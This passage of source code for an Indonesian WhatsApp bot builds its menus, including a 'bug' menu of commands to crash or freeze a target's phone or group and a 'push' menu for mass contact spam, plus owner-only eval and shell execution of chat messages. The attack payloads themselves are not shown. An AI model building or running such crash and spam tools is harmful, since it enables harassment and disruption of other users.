│ ${setv} ${prefix}bisakah (text)
│ ${setv} ${prefix}apakah (text)
│ ${setv} ${prefix}kapan (text)
│ ${setv} ${prefix}kerangajaib (text)
│ ${setv} ${prefix}cekmati (nama lu)
│ ${setv} ${prefix}ceksifat
│ ${setv} ${prefix}cekkhodam (nama lu)
│ ${setv} ${prefix}rate (reply pesan)
│ ${setv} ${prefix}jodohku
│ ${setv} ${prefix}jadian
│ ${setv} ${prefix}fitnah
│ ${setv} ${prefix}halah (text)
│ ${setv} ${prefix}hilih (text)
│ ${setv} ${prefix}huluh (text)
│ ${setv} ${prefix}heleh (text)
│ ${setv} ${prefix}holoh (text)
╰─────┈➤
`
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'randommenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍  
╭─┴─┈➤「 *RANDOM MENU* 」❍  
│ ${setv} ${prefix}coffe  
│ ${setv} ${prefix}cogan  
│ ${setv} ${prefix}cecan  
│ ${setv} ${prefix}jepang  
│ ${setv} ${prefix}korea  
│ ${setv} ${prefix}mobil  
│ ${setv} ${prefix}cina  
│ ${setv} ${prefix}vietnam  
╰─────┈➤`
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break

break
case 'pushmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
╭──┈➤「 *PUSH MENU* 」❍
│ ${setv} ${prefix}pushkontak
│ ${setv} ${prefix}pushkontak1  
│ ${setv} ${prefix}pushkontakid
│ ${setv} ${prefix}jpm
│ ${setv} ${prefix}setteksjpm
│ ${setv} ${prefix}teksjpm    
│ ${setv} ${prefix}svcontact (nama kontak)
╰─────┈➤
    `;

    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'bugmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_ 」❍───❍  
╭──┈➤「 *BUG* 」❍    
│ ${setv} ${prefix}Crash-Force (628xxxx)
│ ${setv} ${prefix}Force-Ui (628xxxx)
│ ${setv} ${prefix}Force-Spam (628xxxx) 
│ ${setv} ${prefix}Bugs-Force (628xxxx) 
│ ${setv} ${prefix}Freeze (linkgc/idgc)
│ ${setv} ${prefix}Bug-Ios (628xxxx)
╰─────┈➤  
`
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'ownermenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍
╭──┈➤「 *OWNER MENU* 」❍
│ ${setv} ${prefix}bot [set]
│ ${setv} ${prefix}done
│ ${setv} ${prefix}setbio
│ ${setv} ${prefix}setppbot
│ ${setv} ${prefix}join
│ ${setv} ${prefix}leave
│ ${setv} ${prefix}leaveid
│ ${setv} ${prefix}block
│ ${setv} ${prefix}listblock
│ ${setv} ${prefix}openblock
│ ${setv} ${prefix}listpc
│ ${setv} ${prefix}listgcbot
│ ${setv} ${prefix}listgc
│ ${setv} ${prefix}replay (pesannya)
│ ${setv} ${prefix}replay1 (pesannya)
│ ${setv} ${prefix}notif
│ ${setv} ${prefix}creategc
│ ${setv} ${prefix}addprem
│ ${setv} ${prefix}delprem
│ ${setv} ${prefix}listprem
│ ${setv} ${prefix}addlimit
│ ${setv} ${prefix}adduang
│ ${setv} ${prefix}bot --settings
│ ${setv} ${prefix}bot settings
│ ${setv} ${prefix}restartbot
│ ${setv} ${prefix}getsession
│ ${setv} ${prefix}delsession
│ ${setv} ${prefix}delsampah
│ ${setv} ${prefix}upsw
╰─────┈➤
`    
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
            
case 'menu': {
await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu1.jpg' // Gantilah dengan lokasi file yang benar
    let audioPath = './lib/media/audio/menu.opus' // Gantilah dengan lokasi file yang benar
  const media = await prepareWAMessageMedia(
    { image: { url: imagePath }}, 
    { upload: Xlesy.waUploadToServer }
  );
  
  let menunya = `Hey *${m.pushName ? m.pushName : 'Unknown'}!* ${ucapanWaktu}
Selamat Datang di *\`XlesyVIP\`* A bot Assistant That Is Ready To Help With Anything On The Menu.

╭──┈➤ *\`INFO USER\`*
│ 々 *Name*  : ${m.pushName ? m.pushName : 'Unknown'} 
│ 々 *User*  : ${isCreator ? 'Owner 亗' : isPremium ? 'Premiun' : 'Free'}
│ 々 *Limit*  : ${isVip ? 'VIP' : db.users[m.sender].limit } 
│ 々 *Money*  : Rp.${db.users[m.sender] ? db.users[m.sender].uang.toLocaleString('id-ID') : '0'}
╰────────────────┈➤

╭──┈➤ *\`INFO  BOT\`*
│ 々 *Name*  : ${botname}
│ 々 *Owner*  : ${author}
│ 々 *Prefix*  : *${prefix}*
│ 々 *Base*  : Xlesy
│ 々 *Mode*  : ${Xlesy.public ? 'Public' : 'Self'}
│ 々 *Versi Sc*  : VIP
│ 々 *Language*  : Javascript
│ 々 *Type* : NodeJs/Case
│ 々 *Library*  : Baileys
│ 々 *Time*  : ${jam} WIB
│ 々 *Date*  : ${tanggal}
│ 々 *Day*  : ${hari}
╰────────────────┈➤

々 Click \`XlesyMenu\` Below 々`;

const buttons = {
buttonsMessage: {
contentText: menunya,
footerText: `© Gxyenn   -> XlesyBot`,
buttons: [
{
buttonId: ".owner",
buttonText: { displayText: "👤 Owner" },
type: 1,
},
{
buttonId: ".sewa",
buttonText: { displayText: "🛍️ Sewa" },
type: 1,
},
{
buttonId: ".example3",
buttonText: { displayText: "📜 List Menu" },
type: 2, // Type 2 untuk list menu
nativeFlowInfo: {
name: "single_select",
paramsJson: JSON.stringify({
title: "XlesyMenu",
sections: [
{
title: "List Menu Yang Sering Dipakai",
highlight_label: "Populer",
rows: [
{
id: ".allmenu",
title: "📚 All Menu",
description: "Menampilkan Semua Menu"
}
]
},
{
title: "List Menu Yang Terpisah",
rows: [
{
id: ".botmenu",
title: "🧿 Bot Menu",
description: "Menampilkan Menu Bot"
},
{
id: ".groupmenu",
title: "💬 Group Menu",
description: "Menampilkan Menu Group"
},
{
id: ".searchmenu",
title: "🔍 Search Menu",
description: "Menampilkan Menu Pencarian"
},
{
id: ". downloadmenu",
title: "📥 Download Menu",
description: "Menampilkan Menu Download"
},
{                                                              id: ".pushmenu",
title: "🚀 Push Menu ",
description: "Menpalikn Menu Push"
},
{
id: ".quotesmenu",
title: "📝 Quotes Menu",
description: "Menampilkan Menu Quotes"
},
{
id: ".libraymenu",
title: "📖 Libray Menu",
description: "Menampilkan Menu Libray"
},
{
id: ".toolsmenu",
title: "🛠️ Tools Menu",
description: "Menampilkan Menu Alat"
},
{
id: ".aimenu",
title: "🧠 Ai Menu",
description: "Menampilkan Menu Al"
},
{
id: ".gamemenu",
title: "🎮 Game Menu",
description: "Menampilkan Menu Game"
},
{
id: ".funmenu",
title: "🎉 Fun Menu",
description: "Menampilkan Menu Hiburan"
},
{
id: ".animemenu",
title: "📺 Anime Menu",
description: "Menampilkan Menu Anime"
},
{
id: ".musicmenu",
title: "🎧 Music Menu",
description: "Menampilkan Menu Audio"
},
{
id: ".randommenu",
title: "🌟 Random Menu",
description: "Menampilkan Menu Acak"
},
{
id: ".ownermenu",
title: "👑 Owner Menu",
description: "Menampilkan Menu Owner"
}
]
},
{
title: "List Menu Bug XlesyVIP",
highlight_label: "Pengembangan",
rows: [
{
id: ".bugmenu",
title: "🦖 BUG XlesyVIP",
description: "Menampilkan Menu BUG XlesyVip"
}
]
},
{
title: "Documentasi Bot",
rows: [
{
id: ".script",
title: "📁 Script",
description: "Menampilkan Information Script"
},
{
id: ".infobot",
title: "🗒️ Information Bot",
description: "Menampilkan Information Bot"
}
]
}
]
})
}
}
],
headerType: 4,
imageMessage: media.imageMessage,
mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
},
};

const generatedMessage = await generateWAMessageFromContent(
m.chat,
buttons,
{
userJid: m.sender,
quoted: ftroli, // Gunakan  sebagai quote
}
);

await Xlesy.relayMessage(m.chat, generatedMessage.message, {
additionalNodes: [
{
tag: "biz",
attrs: {},
content: [
{
tag: "interactive",
attrs: { type: "native_flow", v: "1" },
content: [
{ tag: "native_flow", attrs: { name: "quick_reply" } },
],
},
],
},
],
});

setTimeout(async () => {
await Xlesy.sendMessage(m.chat, { audio: { url: audioPath }, mimetype: 'audio/mpeg', ptt: true }, { quoted: fkontak1 })
}, 1000); // Delay 3 detik agar video/foto dikirim lebih dulu
await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break;
        
			default:
			if (budy.startsWith('>')) {
				if (!isCreator) return
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await m.reply(evaled)
				} catch (err) {
					await m.reply(String(err))
				}
			}
			if (budy.startsWith('<')) {
				if (!isCreator) return
				try {
					let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await m.reply(evaled)
				} catch (err) {
					await m.reply(String(err))
				}
			}
			if (budy.startsWith('$')) {
				if (!isCreator) return
				if (!text) return
				exec(budy.slice(2), (err, stdout) => {
					if (err) return m.reply(`${err}`)
					if (stdout) return m.reply(stdout)
				})
			}
		}
	} catch (err) {
		console.log(err);
		//m.reply('*❗ Internal server error️*');
		Xlesy.sendFromOwner(owner, `Halo sayang, sepertinya ada yang error nih, jangan lupa diperbaiki ya\n\nVersion : *${require('./package.json').version}*\n\n*Log error:*\n\n` + util.format(err), m, { contextInfo: { isForwarded: true }})
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});